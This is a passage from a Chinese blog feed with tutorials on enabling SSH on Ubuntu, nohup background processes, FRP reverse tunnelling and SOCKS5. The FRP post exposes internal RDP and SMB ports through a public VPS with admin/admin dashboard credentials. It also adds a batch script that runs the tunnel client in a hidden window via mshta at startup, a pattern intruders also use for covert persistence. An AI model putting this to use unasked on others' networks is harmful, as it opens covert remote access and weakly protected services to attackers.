trong>版本</strong>：SSH协议有两个主要版本，SSH1和SSH2，其中SSH2更为安全和流行，提供了更强的加密和更好的性能。</li></ol><p>SSH因其安全性和多功能性，成为网络通信中不可或缺的一部分，尤其在需要远程管理和数据安全传输的场景中。</p><p>同时，启用  SSH 将会允许你远程连接到你的系统，并且执行管理员任务。你将能够通过 <code>scp</code>和<code>sftp</code>安全传输文件。</p><h1 id="二、ubuntu启用ssh"><a href="#二、ubuntu启用ssh" class="headerlink" title="二、ubuntu启用ssh"></a>二、ubuntu启用ssh</h1><p>默认情况下，当 Ubuntu 最初被安装的时候，通过 SSH 进行远程访问是不被允许的。</p><h2 id="2-1-安装openssh-server"><a href="#2-1-安装openssh-server" class="headerlink" title="2.1 安装openssh-server"></a>2.1 安装openssh-server</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当被提示时，输入你的密码并且按 Enter，继续安装。</p><h2 id="2-2-验证服务是否正在运行"><a href="#2-2-验证服务是否正在运行" class="headerlink" title="2.2 验证服务是否正在运行"></a>2.2 验证服务是否正在运行</h2><p>一旦安装完成，SSH 服务将会被自动启动。你可以验证 SSH 是否正在运行，输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/%E6%88%AA%E5%B1%8F2024-12-23%2014.14.20.png" style="zoom:50%;"><h2 id="2-3-ssh登录"><a href="#2-3-ssh登录" class="headerlink" title="2.3 ssh登录"></a>2.3 ssh登录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> sxk@192.168.155.31 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu的ssh服务 </tag>
            
            <tag> 系统运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程后台管理</title>
      <link href="/2024/12/17/xi-tong-yun-wei/jin-cheng-hou-tai-guan-li/"/>
      <url>/2024/12/17/xi-tong-yun-wei/jin-cheng-hou-tai-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="一、nohup"><a href="#一、nohup" class="headerlink" title="一、nohup"></a>一、nohup</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p><code>nohup</code> 是一个命令行实用程序，用于在用户注销后继续运行命令。它的名字来源于 “no hang up”（不要挂断），意味着即使用户挂断（注销）了，命令也会继续执行。</p><h2 id="1-2-用法"><a href="#1-2-用法" class="headerlink" title="1.2 用法"></a>1.2 用法</h2><p>以下是 <code>nohup</code> 的一些关键特性和用法：</p><ol><li><p><strong>后台运行命令</strong>：</p><ul><li><code>nohup</code> 允许你运行一个命令，即使在终端关闭或用户注销后，该命令也会继续在后台运行。</li></ul></li><li><p><strong>忽略挂起信号</strong>：</p><ul><li>默认情况下，当终端会话结束时，所有的进程都会收到 <code>SIGHUP</code>（挂起信号），这会导致大多数程序终止。<code>nohup</code> 命令会忽略这个信号，使得进程可以继续运行。</li></ul></li><li><p><strong>输出重定向</strong>：</p><ul><li>如果你不指定输出文件，<code>nohup</code> 会将输出重定向到名为 <code>nohup.out</code> 的文件中。如果 <code>nohup.out</code> 文件已存在，输出会被追加到文件末尾。</li></ul></li><li><p><strong>使用示例</strong>：</p><ul><li><p>运行一个命令并忽略挂起信号：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> some-command <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><ul><li><p>将输出重定向到特定文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> some-command <span class="token operator">&gt;</span> output.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><p>​        这里 <code>&gt;</code> 将标准输出重定向到 <code>output.log</code>，<code>2&gt;&amp;1</code> 将标准错误也重定向到同一个文件。</p><ol start="5"><li><p><strong>退出代码</strong>：</p><ul><li><code>nohup</code> 命令本身会返回 <code>0</code>，表示成功执行。它不会返回后台运行命令的退出代码。</li></ul></li><li><p><strong>查看后台进程</strong>：</p><ul><li>你可以使用 <code>ps</code> 命令查看后台运行的 <code>nohup</code> 进程，或者使用 <code>jobs</code> 查看当前会话的后台作业。</li></ul></li><li><p><strong>结束后台进程</strong>：</p><ul><li>如果需要结束 <code>nohup</code> 启动的后台进程，可以使用 <code>kill</code> 命令加上进程的 PID（进程编号）。</li></ul></li></ol><h2 id="1-3-使用示例"><a href="#1-3-使用示例" class="headerlink" title="1.3 使用示例"></a>1.3 使用示例</h2><p>在一个需要长时间（24小时以上）运行python脚本的场景中，一开始通过MobaXTerm连接远程主机获取ssh的shell，然后直接在终端运行 <code>/路径/python xxxx.py</code>，第二天查看日志的时候，脚本莫名其妙终止了。怀疑可能是堡垒机回收或者shell断开连接导致的。</p><p>为了测试是否是上述原因，并解决因为shell断连导致脚本运行结束的问题，使用nohup后台运行python任务进程。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> xxxxx/python xxxxx.py <span class="token operator">&gt;</span> myTest.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>命令详解：</li></ul><ol><li>**<code>nohup</code>**：这是命令的开始，表示忽略挂起信号，即使用户注销或终端关闭，命令也会继续运行。</li><li>**<code>xxxxx/python</code>**：这部分应该是要执行的 Python 解释器的路径。请确保替换 <code>xxxxx</code> 为实际的路径，例如 <code>/usr/bin/python</code>。</li><li>**<code>xxxxx.py</code>**：这是要运行的 Python 脚本的路径。同样，请确保替换 <code>xxxxx</code> 为实际的脚本路径，例如 <code>/home/user/myscript.py</code>。</li><li>**<code>&gt;</code>**：这是一个输出重定向操作符，它会将标准输出（stdout）重定向到后面指定的文件。</li><li>**<code>myTest.log</code>**：这是希望将标准输出重定向到的文件名。如果该文件不存在，<code>nohup</code> 会创建它；如果文件已存在，输出会覆盖到myTest.log文件。</li><li>**<code>2&gt;&amp;1</code>**：这是一个错误输出重定向操作符，它将标准错误（stderr）重定向到标准输出（stdout）。这意味着错误信息也会被写入到 <code>myTest.log</code> 文件中。</li><li>**<code>&amp;</code>**：这是一个后台运行操作符，它将命令放在后台执行，允许您继续在同一终端进行其他操作。</li></ol><p>综上所述，这个命令的意思是：使用 <code>nohup</code> 运行指定路径的 Python 解释器来执行指定路径的 Python 脚本，并将标准输出和标准错误都重定向到 <code>myTest.log</code> 文件中，同时让这个命令在后台运行。</p><ul><li>2&gt;&amp;1详解：</li></ul><p><code>2&gt;&amp;1</code> 是一个在 Unix 和类 Unix 系统中常用的 shell 操作符，用于将标准错误（stderr，文件描述符为 2）重定向到标准输出（stdout，文件描述符为 1）的位置。下面是对 <code>2&gt;&amp;1</code> 的详细解释：</p><ol><li>**<code>2</code>**：这个数字代表标准错误输出（stderr）的文件描述符。在 Unix 系统中，每个打开的文件都有一个与之关联的文件描述符，而标准错误输出默认的文件描述符是 2。</li><li>**<code>&gt;</code>**：这是一个重定向操作符，用于将紧随其后的文件描述符的输出重定向到指定的位置。</li><li><strong><code>&amp;1</code><strong>： <code>1</code> 是标准输出（stdout）的文件描述符。<code>&amp;1</code> 表示将前面的文件描述符（这里是标准错误 stderr）重定向到标准输出的位置。「这里的</strong>&amp;<strong>没有固定的意思放在</strong>&gt;<strong>后面的</strong>&amp;<strong>，表示重定向的目标不是一个</strong>文件</strong>，而是一个<strong>文件描述符</strong></li></ol><p>综合起来，<code>2&gt;&amp;1</code> 的作用是将标准错误输出重定向到标准输出的位置。这意味着，原本应该输出到 stderr 的内容（通常是错误信息）现在会和 stdout 的内容一起输出。</p></blockquote><p><code>nohup</code> 是一个非常有用的工具，特别是在需要长时间运行的命令或者需要在服务器上执行长时间任务时。通过使用 <code>nohup</code>，你可以确保即使在远程会话断开后，任务仍然可以继续执行。</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统运维 </tag>
            
            <tag> 后台进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FRP内网穿透</title>
      <link href="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/"/>
      <url>/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是FRP"><a href="#一、什么是FRP" class="headerlink" title="一、什么是FRP"></a>一、什么是FRP</h1><h2 id="1-1-FRP简介"><a href="#1-1-FRP简介" class="headerlink" title="1.1 FRP简介"></a>1.1 FRP简介</h2><p>FRP（Fast Reverse Proxy）是一个开源、高性能的内网穿透和反向代理应用，它支持TCP、UDP、HTTP、HTTPS等多种协议。FRP可以帮助用户将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。</p><p>FRP由客户端（frpc）和服务端（frps）组成，服务端通常部署在具有公网IP的机器上，而客户端部署在需要穿透的内网服务所在的机器上。通过这种方式，FRP实现了内网服务的公网访问，同时提供了安全性和便利性。</p><p>FRP的一些应用场景：</p><ul><li><strong>远程访问内网服务</strong>：例如，通过FRP访问家里或公司的服务器，而不需要配置复杂的端口映射。</li><li><strong>开发环境共享</strong>：开发者可以通过FRP共享自己本地的开发环境，外部团队可以直接访问内网的应用和API。</li><li><strong>穿透防火墙/NAT</strong>：即使内网服务器处于NAT后面或防火墙后面，仍然可以通过FRP将服务暴露到公网。</li></ul><h2 id="1-2-FRP工作原理"><a href="#1-2-FRP工作原理" class="headerlink" title="1.2 FRP工作原理"></a>1.2 FRP工作原理</h2><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2010.09.24.png" style="zoom:50%;"><ul><li>服务端（frps）运行，监听一个主端口，等待客户端（frpc）的连接；</li><li>客户端（frpc）连接到服务端（frps）的主端口，同时告诉服务端要监听的端口和转发类型；</li><li>服务端fork新的进程监听客户端指定的监听端口；</li><li>外网用户连接到上一步服务端fork的进程所监听的端口，服务端（frps）通过和客户端（frpc）的连接将数据转发到客户端（frpc）；</li><li>客户端（frpc）进程再将数据转发到本地服务</li><li>后续流量从内网本地服务转发给frpc，frpc转发给frps，frps转发给外网用户，从而实现内网对外暴露服务的能力。</li></ul><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2010.14.00.png" style="zoom:50%;"><blockquote><p>图中，内网本地的127.0.0.1:80端口的web服务通过客户端配置，映射到VPS上的47.97.177.130:30001端口。后续流量从本地80端口转发到frpc，frpc通过vps的7000端口转发给vps，vps在把流量转发到30001端口，如此便实现了内网服务在外网的暴露，外网用户可以从外网访问到内网的80端口的服务。</p></blockquote><h1 id="二、实现FRP内网穿透的前提条件"><a href="#二、实现FRP内网穿透的前提条件" class="headerlink" title="二、实现FRP内网穿透的前提条件"></a>二、实现FRP内网穿透的前提条件</h1><ol><li>VPS一台（也可以是具有公网IP的实体机），因为frp的原理是利用服务端VPS来进行流量转发，因而VPS的性能直接决定了后续连接的质量。</li><li>访问目标设备（就是你最终要访问的内网设备）</li><li>简单的Linux命令基础</li></ol><h1 id="三、实现方法"><a href="#三、实现方法" class="headerlink" title="三、实现方法"></a>三、实现方法</h1><h2 id="3-1-服务端（frps）"><a href="#3-1-服务端（frps）" class="headerlink" title="3.1 服务端（frps）"></a>3.1 服务端（frps）</h2><p>1）通过SSH与VPS建立连接，然后执行<code>arch</code>命令查看硬件架构的类型。</p><blockquote><p><code>arch</code>命令是一个用于显示当前主机的硬件架构类型的Linux命令。这个命令在多个Linux发行版中都是可用的，包括RedHat、RHEL、Ubuntu、CentOS等。通过使用<code>arch</code>命令，你可以快速地获取当前系统的硬件架构信息，这对于跨平台编程、软件包管理和系统故障排除等场景非常有用。</p></blockquote><p>2）根据架构不同，选择相应版本并进行下载。</p><p>如果是x86_64即可选择amd64</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/fatedier/frp/releases/download/v0.22.0/frp_0.22.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>x86_64 和 amd64：</p><p><code>x86_64</code>和<code>amd64</code>都是指64位的x86架构，它们是同一种架构的不同名称。</p><ol><li><strong>x86_64</strong>：<ul><li>这个术语是英特尔（Intel）的64位扩展架构的官方名称。</li><li>x86_64是x86架构的64位扩展，x86是英特尔最初为其8086处理器定义的32位架构。</li><li>x86_64架构支持64位内存寻址，允许操作系统和应用程序访问超过4GB的内存。</li></ul></li><li><strong>amd64</strong>：<ul><li><code>amd64</code>是AMD为其64位处理器架构所使用的名称。</li><li>实际上，<code>amd64</code>与<code>x86_64</code>是兼容的，因为AMD的64位处理器也是基于x86架构设计的。</li><li><code>amd64</code>同样支持64位计算和更大的内存寻址空间。</li></ul></li></ol><p>尽管名称不同，但这两个术语都指的是同一种64位计算架构。在大多数情况下，它们可以互换使用，因为它们在技术上是等效的。这种架构被广泛应用于个人电脑、服务器和工作站中，因为它提供了更好的性能和更大的内存寻址能力。</p><p>所以在这里，arch返回的架构如果是x86_64，那么下载frp的时候可以选择amd64的安装包。</p></blockquote><p>3）解压查看文件内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> frp_0.22.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件夹改个名，方便使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> frp_0.22.0_linux_amd64 frp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看文件夹内容：</p><ul><li>frps</li><li>frps.ini</li><li>frpc</li><li>frpc.ini</li></ul><p>其中frps和frps.ini是frp的服务端程序及配置文件，frpc和frpc.ini是frp的客户端程序及配置文件。首先在VPS配置服务端程序，客户端程序相关的文件可以删除。</p><p>4）frps.ini</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span>dashboard_port <span class="token operator">=</span> <span class="token number">7500</span>token <span class="token operator">=</span> <span class="token number">12345678</span>dashboard_user <span class="token operator">=</span> admindashboard_pwd <span class="token operator">=</span> adminvhost_http_port <span class="token operator">=</span> <span class="token number">10080</span>vhost_https_port <span class="token operator">=</span> <span class="token number">10443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><code>bind_port = 7000</code>：这是<code>frp</code>服务端监听的端口，用于接收来自客户端的连接。默认情况下，客户端会将流量发送到这个端口。</li><li><code>dashboard_port = 7500</code>：这是<code>frp</code>的仪表板（Dashboard）端口，用于访问<code>frp</code>的Web管理界面。通过这个端口，你可以查看连接状态、流量统计等信息。</li><li><code>token = 12345678</code>：这是用于客户端和服务端之间认证的令牌。客户端在连接到服务端时需要提供这个令牌，以确保连接的安全性。</li><li><code>dashboard_user = admin</code>：这是访问仪表板时使用的用户名。</li><li><code>dashboard_pwd = admin</code>：这是访问仪表板时使用的密码。</li><li><code>vhost_http_port = 10080</code>：这是用于虚拟主机的HTTP端口。如果你配置了<code>frp</code>的虚拟主机功能，那么通过这个端口可以访问绑定的域名。</li><li><code>vhost_https_port = 10443</code>：这是用于虚拟主机的HTTPS端口。与<code>vhost_http_port</code>类似，但是用于加密的HTTPS流量。</li></ol></blockquote><p>5）启动frps</p><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">./frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看到屏幕输出这样一段内容，即表示运行正常，如果出现错误提示，请检查上面的步骤。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>service.go:130<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:7000<span class="token punctuation">[</span>service.go:172<span class="token punctuation">]</span> http <span class="token function">service</span> listen on <span class="token number">0.0</span>.0.0:10080<span class="token punctuation">[</span>service.go:193<span class="token punctuation">]</span> https <span class="token function">service</span> listen on <span class="token number">0.0</span>.0.0:10443<span class="token punctuation">[</span>service.go:216<span class="token punctuation">]</span> Dashboard listen on <span class="token number">0.0</span>.0.0:7500<span class="token punctuation">[</span>root.go:210<span class="token punctuation">]</span> Start frps success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问vpsip:7500 并使用自己设置的用户名密码登录，即可看到仪表板界面。</p><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2009.46.04.png" style="zoom:50%;"><p>6）服务端后台运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> ./frps <span class="token parameter variable">-c</span> frps.ini <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>nohup</code>：nohup是一个后台程序管理工具，用于运行命令并其在你退出终端会话后仍然继续运行。<code>nohup</code>的名称来源于“no hang up”（不要挂断）。</li><li><code>./frps</code>：这是<code>frp</code>服务端程序的可执行文件。<code>.</code>/<code>表示当前目录，</code>frps`是要执行的程序。</li><li><code>-c frps.ini</code>：这是传递给<code>frps</code>程序的一个参数，指定使用<code>frps.ini</code>文件作为配置文件。</li><li><code>&amp;</code>：这个符号将命令放到后台执行，即使终端关闭，程序也会继续运行。</li></ul><p>当你执行这个命令时，<code>frps</code>服务会使用<code>frps.ini</code>配置文件中的设置启动，并在后台运行，不会占用终端。这样，你可以继续使用终端进行其他操作，而<code>frps</code>服务会在后台保持运行状态。</p><p>如果你需要查看<code>frps</code>服务的输出，可以使用<code>nohup</code>命令的输出重定向功能，例如：</p><p>nohup ./frps -c frps.ini &gt; frps.log 2&gt;&amp;1 &amp;</p><p>这个命令会将<code>frps</code>的标准输出（<code>stdout</code>）和标准错误（<code>stderr</code>）都重定向到<code>frps.log</code>文件中，这样你就可以通过查看<code>frps.log</code>文件来获取服务的日志信息。</p></blockquote><p>输出如下内容即表示正常运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nohup: ignoring input and appending output to <span class="token string">'nohup.out'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时可先使用Ctrl+C关闭nohup，frps依然会在后台运行，使用jobs命令查看后台运行的程序<code>jobs</code>，在结果中我们可以看到frps正在后台正常运行</p><pre class="line-numbers language-none"><code class="language-none">[1]+  Running                 nohup ./frps -c frps.ini &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时访问 vpsip:7500 依然可以打开仪表板界面，至此，服务端即设置完成，可以关闭SSH窗口。</p><h2 id="3-2-客户端（frpc）"><a href="#3-2-客户端（frpc）" class="headerlink" title="3.2 客户端（frpc）"></a>3.2 客户端（frpc）</h2><p>frp客户端部署在我们真正想访问的内网设备。</p><p>1）根据内网设备类型下载相应的frp程序</p><p>2）frpc.ini配置文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> 【填vps的ip<span class="token operator">==</span>frps的ip】server_port <span class="token operator">=</span> <span class="token number">7000</span>token <span class="token operator">=</span> won517574356<span class="token punctuation">[</span>rdp<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1           local_port <span class="token operator">=</span> <span class="token number">3389</span>remote_port <span class="token operator">=</span> <span class="token number">7001</span>  <span class="token punctuation">[</span>smb<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">445</span>remote_port <span class="token operator">=</span> <span class="token number">7002</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这是 <code>frp</code> 客户端的配置文件，用于定义客户端如何连接到服务端以及如何转发特定的端口。下面是各配置项的详细解释：</p><p>[common] 部分：</p><ul><li><code>server_addr</code>：服务端的IP地址，这里需要填写你的VPS（虚拟专用服务器）的IP地址，也就是运行 <code>frps</code> 的服务器的IP。</li><li><code>server_port</code>：服务端监听的端口，这里设置为7000，与服务端配置文件中的 <code>bind_port</code> 相对应。</li><li><code>token</code>：用于客户端和服务端之间认证的令牌，这里设置为 <code>won517574356</code>，需要与服务端配置文件中的 <code>token</code> 一致。</li></ul><p>[rdp] 部分：</p><ul><li><code>type</code>：代理类型，这里设置为 <code>tcp</code>，表示使用TCP协议。</li><li><code>local_ip</code>：内网中需要被代理的机器的IP地址，这里设置为 <code>127.0.0.1</code>，通常用于本地机器。</li><li><code>local_port</code>：内网中需要被代理的机器的端口，这里设置为3389，是Windows远程桌面（RDP）的标准端口。</li><li><code>remote_port</code>：在服务端上开放的端口，用于外部访问，这里设置为7001。</li></ul><p>[smb] 部分：</p><ul><li><code>type</code>：代理类型，这里同样设置为 <code>tcp</code>。</li><li><code>local_ip</code>：内网中需要被代理的机器的IP地址，这里也是 <code>127.0.0.1</code>。</li><li><code>local_port</code>：内网中需要被代理的机器的端口，这里设置为445，是Windows文件共享（SMB）的标准端口。</li><li><code>remote_port</code>：在服务端上开放的端口，用于外部访问，这里设置为7002。</li></ul></blockquote><p>通过这个配置文件，你可以将内网中的RDP和SMB服务暴露给公网，使得你可以从外部通过VPS的IP地址和相应的 <code>remote_port</code> 来访问这些服务。例如，你可以通过 <code>server_addr:7001</code> 来访问RDP服务，通过 <code>server_addr:7002</code> 来访问SMB服务。</p><p>3）运行客户端程序</p><blockquote><p>frpc程序不能直接双击运行！</p></blockquote><p>找到程序安装位置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frpc <span class="token parameter variable">-c</span> frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>service.go:205<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>2b65b4e58a5917ac<span class="token punctuation">]</span>, server udp port <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>proxy_manager.go:136<span class="token punctuation">]</span> <span class="token punctuation">[</span>2b65b4e58a5917ac<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>rdp smb<span class="token punctuation">]</span><span class="token punctuation">[</span>control.go:143<span class="token punctuation">]</span> <span class="token punctuation">[</span>smb<span class="token punctuation">]</span> start proxy success<span class="token punctuation">[</span>control.go:143<span class="token punctuation">]</span> <span class="token punctuation">[</span>rdp<span class="token punctuation">]</span> start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行frpc程序，窗口中输出如上内容表示运行正常。</p><p>不关闭命令行窗口，此时可以在局域网外使用相应程序访问 vpsip:remote_port （端口为自定义的remote_port）即可访问到相应服务。</p><p>4）客户端后台运行及开机自启</p><p>创建fprc.bat文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off<span class="token keyword">if</span> <span class="token string">"%1"</span> <span class="token operator">==</span> <span class="token string">"h"</span> goto beginmshta vbscript:createobject<span class="token punctuation">(</span><span class="token string">"wscript.shell"</span><span class="token punctuation">)</span>.run<span class="token punctuation">(</span><span class="token string">""</span>"%~nx0<span class="token string">""</span> h",0<span class="token punctuation">)</span><span class="token punctuation">(</span>window.close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">exit</span>:beginREM<span class="token builtin class-name">cd</span> C:<span class="token punctuation">\</span>frpfrpc <span class="token parameter variable">-c</span> frpc.ini<span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这段代码是一个Windows批处理脚本（<code>.bat</code> 文件），用于以隐藏窗口的方式运行 <code>frp</code> 客户端程序 <code>frpc</code>。下面是脚本的详细解释：</p><ol><li><code>@echo off</code>：关闭命令的回显，使得执行时不会显示执行的命令。</li><li><code>if "%1" == "h" goto begin</code>：检查传递给批处理脚本的第一个参数（<code>%1</code>），如果参数是 <code>h</code>，则跳转到标签 <code>begin</code>。</li><li><code>mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&amp;&amp;exit</code>：如果第一个参数不是 <code>h</code>，则使用 <code>mshta</code> 命令（Microsoft HTML Application）执行一个VBScript脚本来运行当前脚本，并传递 <code>h</code> 作为参数，同时关闭 <code>mshta</code> 窗口。<code>%~nx0</code> 是当前批处理文件的名称和扩展名。</li><li><code>:begin</code>：一个标签，用于在条件满足时跳转到这里。</li><li><code>cd C:\frp</code>：将命令行的当前目录更改为 <code>C:\frp</code>，假设 <code>frpc.ini</code> 配置文件和 <code>frpc</code> 可执行文件位于这个目录。</li><li><code>frpc -c frpc.ini</code>：运行 <code>frpc</code> 客户端程序，并使用 <code>frpc.ini</code> 配置文件。</li><li><code>exit</code>：退出批处理脚本。</li></ol><p>这个脚本的目的是让用户可以通过双击批处理文件来以隐藏窗口的方式启动 <code>frpc</code> 客户端，而不需要打开命令行窗口。如果用户希望在命令行中启动 <code>frpc</code> 并看到输出，他们可以传递 <code>h</code> 作为参数，例如 <code>your_script.bat h</code>，这样就不会使用 <code>mshta</code> 来隐藏窗口。</p><p>请注意，使用 <code>mshta</code> 来隐藏窗口是一种不太常见的做法，可能会被一些安全软件视为可疑行为。此外，<code>mshta</code> 命令在某些Windows版本中可能已被禁用。</p></blockquote><p>之后直接运行这个 .bat 文件即可启动frpc并隐藏窗口（可在任务管理器中退出）。</p><p>如果想要开机启动，把这个 .bat 文件放在Windows的开机启动文件夹即可。</p><p>之后如果想暴露其他服务，只需要需要在frpc.ini后追加规则即可。</p><blockquote><p> 建议在使用frp直接测试内网穿透前，先在局域网内测试好相关功能的正常使用，并配置好可能会影响的Windows防火墙等内容，在内网调试通过后再使用frp进行内网穿透测试。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://juejin.cn/post/7042486792011907086">https://juejin.cn/post/7042486792011907086</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44801963/article/details/121104146">https://blog.csdn.net/weixin_44801963/article/details/121104146</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FRP </tag>
            
            <tag> FRP内网穿透 </tag>
            
            <tag> 内网攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOCKS5代理协议</title>
      <link href="/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/"/>
      <url>/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SOCKS5协议简介"><a href="#一、SOCKS5协议简介" class="headerlink" title="一、SOCKS5协议简介"></a>一、SOCKS5协议简介</h1><p>SOCKS5（Socket secure 5）协议是一种网络代理协议，它在客户端和服务器之间扮演中介角色，它允许客户端通过代理服务器与目标服务器进行通信，隐藏客户端的真实IP地址和身份信息。SOCKS5代理是一种传输层代理，工作在网络协议栈中的传输层，可以支持多种网络协议（如TCP和UDP）的代理。根据OSI七层模型来划分，SOCKS属于会话层协议，位于表示层与传输层之间。</p><p>通过 SOCKS5 代理，客户端可以在不直接与目标服务器通信的情况下，通过代理服务器来访问网络资源。这种代理方式对于保护客户端的隐私和实现网络匿名性非常有用，同时还可以绕过防火墙和地理限制。</p><ul><li>SOCKS5是SOCKS协议的第五个版本，作为socks4的一个延伸，在socks4的基础上新增<strong>UDP转发</strong>和<strong>认证功能</strong>。唯一遗憾的是socks5并不兼容socks4协议。socks5由IETF在1996年正式发布，经过这么多年的发展，互联网上基本上都以socks5为主，socks4已经退出了历史的舞台。</li><li>SOCKS5支持IPv4和IPv6地址，适应不同网络环境的需求。</li></ul><p>socks5的RFC地址：</p><ul><li><p>rfc1928：<a href="https://www.ietf.org/rfc/rfc1928.txt">https://www.ietf.org/rfc/rfc1928.txt</a></p></li><li><p>rfc1929：<a 